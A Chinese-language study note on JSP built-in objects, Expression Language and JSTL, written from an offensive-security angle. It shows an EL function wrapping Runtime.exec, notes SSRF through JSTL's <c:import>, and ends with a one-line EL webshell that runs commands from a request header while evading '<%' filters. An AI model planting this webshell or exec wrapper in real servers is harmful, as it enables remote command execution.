前置基础
---

### 内置对象
```
1、request：表示⼀次请求，HttpServletRequest
2、response：表示⼀次响应，HttpServletResponse
3、pageContext：⻚⾯上下⽂，获取⻚⾯信息，PageContext
4、session：表示⼀次会话，保存⽤户信息，HttpSession
5、application：表示当前 Web 应⽤，全局对象，保存所有⽤户共享信息，ServletContext
6、config：当前 JSP 对应的 Servlet 的 ServletConfig 对象，获取当前 Servlet 的信息
7、out：向浏览器输出数据，JspWriter
8、page：当前 JSP 对应的 Servlet 对象，Servlet
9、exception：表示 JSP ⻚⾯发⽣的异常，Exception
```

### response.getRequestDispatcher 和 response.sendRedirect 的区别
```
getRequestDispatcher 是将同⼀个请求传给下⼀个⻚⾯
sendRedirect         是创建⼀个新的请求传给下⼀个⻚⾯，之前的请求结束⽣命周期
```


### JSP EL
**简介**

Expression Language 简称EL，是Java中的一种特殊的通用编程语言，借鉴于JavaScript和XPath。主要作用是在Java Web应用程序嵌入到网页（如JSP）中，用以访问页面的上下文以及不同作用域中的对象 ，取得对象属性的值，或执行简单的运算或判断操作。
EL获取到某个数据时，会自动进行数据类型的转换。

**pom.xml**
> Tomcat 默认携带el-api.jar
```xml
<dependency>  
    <groupId>javax.el</groupId>  
    <artifactId>javax.el-api</artifactId>  
    <version>2.2.4</version>  
    <scope>provided</scope>  
</dependency>  
```
**常用语法**
```
${EL表达式}
```
获取pageContext对象
```java
${pageContext}
```
![image](https://user-images.githubusercontent.com/55024146/159130650-1d803e4d-1fec-474b-89fd-39a1f68f0e17.png)

**EL表达式调用java方法**

1）新建类并定义静态方法

至于为什么得是静态方法？

![image](https://user-images.githubusercontent.com/55024146/159131463-0f8965ba-3d37-4ec3-8713-a757f56ee415.png)


```java
package com.lab;

import java.io.IOException;

public class ELTest {
   public static String Exec(String cmd) throws IOException {
      return Runtime.getRuntime().exec(cmd).toString();
   }
}

```
2）在WEB-INF文件夹下（除lib和classess目录外）新建tld文件
```xml
<?xml version="1.0" encoding="UTF-8"?>
<taglib version="2.0" xmlns="http://java.sun.com/xml/ns/j2ee"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd">
    <tlib-version>1.0</tlib-version>
    <short-name>ELTest</short-name>
    <uri>http://10.10.10.1:8080/ELTest</uri>
    <function>
        <name>Exec</name>
        <function-class>com.lab.ELTest</function-class>
        <function-signature> java.lang.String Exec(java.lang.String)</function-signature>
    </function>
</taglib>
```
3）jsp头部导入
```jsp
<%@ taglib prefix="ELTest" uri="http://10.10.10.1:8080/ELTest" %>
```
4）el标签使用
```jsp
${ELTest:Exec("calc")}
```

测试效果

![image](https://user-images.githubusercontent.com/55024146/159131518-e5d5324e-b6cb-4c94-b1c7-1794f3cd49a8.png)

### JSTL
**简介**

JSP Standard Tag Library JSP 标准标签库，JSP 为开发者提供的⼀系列的标签，使⽤这些标签可以完成
⼀些逻辑处理，⽐如循环遍历集合，让代码更加简洁，不再出现 JSP 脚本穿插的情况。
实际开发中 EL 和 JSTL 结合起来使⽤，JSTL 侧重于逻辑处理，EL 负责展示数据。


导⼊ JSTL 标签库
```
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
```


**安全问题-SSRF漏洞**

<c:import>标签提供了所有<jsp:include>行为标签所具有的功能，同时也允许包含绝对URL。

实际案例
- [蓝凌OA前台SSRF+dataxml.jsp RCE漏洞](https://422926799.github.io/posts/980cff8b.html)

![image](https://user-images.githubusercontent.com/55024146/159132587-8ded391a-604e-43a2-87c9-d5696b506df8.png)


利用研究
---

### JSP + EL构造 Webshell（规避 <%）

![image](https://user-images.githubusercontent.com/55024146/179147020-e4ce602e-640b-44ab-a431-2056677474b3.png)

`el.jsp`

```
${Runtime.getRuntime().exec(header.cmd)}
```
测试效果

![image](https://user-images.githubusercontent.com/55024146/179147643-956c3938-e89f-4368-b8cd-c54021aad5e3.png)










